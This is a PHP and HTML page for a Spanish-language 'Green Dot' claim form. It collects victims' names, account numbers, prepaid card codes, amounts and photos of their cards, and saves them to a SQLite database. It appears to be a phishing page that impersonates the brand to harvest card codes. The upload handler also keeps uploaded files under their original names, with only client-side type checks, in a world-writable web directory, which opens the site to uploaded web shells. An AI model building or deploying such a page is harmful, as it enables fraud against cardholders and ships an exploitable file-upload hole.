<?php
$upload_dir = 'uploads/';
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $nombre = $_POST['nombre'] ?? '';
    $cuenta = $_POST['cuenta'] ?? '';
    $codigo = $_POST['codigo'] ?? '';
    $monto = $_POST['monto'] ?? '';

    $factura_name = $upload_dir . time() . '_' . basename($_FILES['factura']['name']);
    $tarjeta_name = $upload_dir . time() . '_' . basename($_FILES['tarjeta']['name']);

    if (move_uploaded_file($_FILES['factura']['tmp_name'], $factura_name) && 
        move_uploaded_file($_FILES['tarjeta']['tmp_name'], $tarjeta_name)) {
        
        try {
            $db = new PDO('sqlite:claims.db');
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $sql = "INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) 
                    VALUES (:nom, :cue, :cod, :mon, :fac, :tar, :fec)";
            $stmt = $db->prepare($sql);
            $stmt->execute([
                ':nom' => $nombre,
                ':cue' => $cuenta,
                ':cod' => $codigo,
                ':mon' => $monto,
                ':fac' => $factura_name,
                ':tar' => $tarjeta_name,
                ':fec' => date('Y-m-d H:i:s')
            ]);
            $message = "<p style='color:green;'>¡Solicitud enviada con éxito!</p>";
        } catch (Exception $e) {
            $message = "<p style='color:red;'>Error al guardar: " . $e->getMessage() . "</p>";
        }
    } else {
        $message = "<p style='color:red;'>Error al subir las imágenes.</p>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Aplicar Reclamo Green Dot</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
        .form-container { background: white; padding: 20px; border-radius: 8px; max-width: 500px; margin: auto; }
        input { width: 100%; margin-bottom: 10px; padding: 8px; box-sizing: border-box; }
        label { font-weight: bold; }
        button { background: #28a745; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class='form-container'>
        <h2>Formulario de Reclamo</h2>
        <?php echo $message; ?>
        <form method='POST' enctype='multipart/form-data'>
            <label>Nombre Completo:</label>
            <input type='text' name='nombre' required>
            <label>Número de Cuenta:</label>
            <input type='text' name='cuenta'>
            <label>Código de Tarjeta:</label>
            <input type='text' name='codigo'>
            <label>Monto:</label>
            <input type='number' step='0.01' name='monto'>
            <label>Subir Foto de Factura:</label>
            <input type='file' name='factura' accept='image/*' required>
            <label>Subir Foto de Tarjeta:</label>
            <input type='file' name='tarjeta' accept='image/*' required>
            <button type='submit'>Enviar Reclamo</button>
        </form>
    </div>
</body>
</html>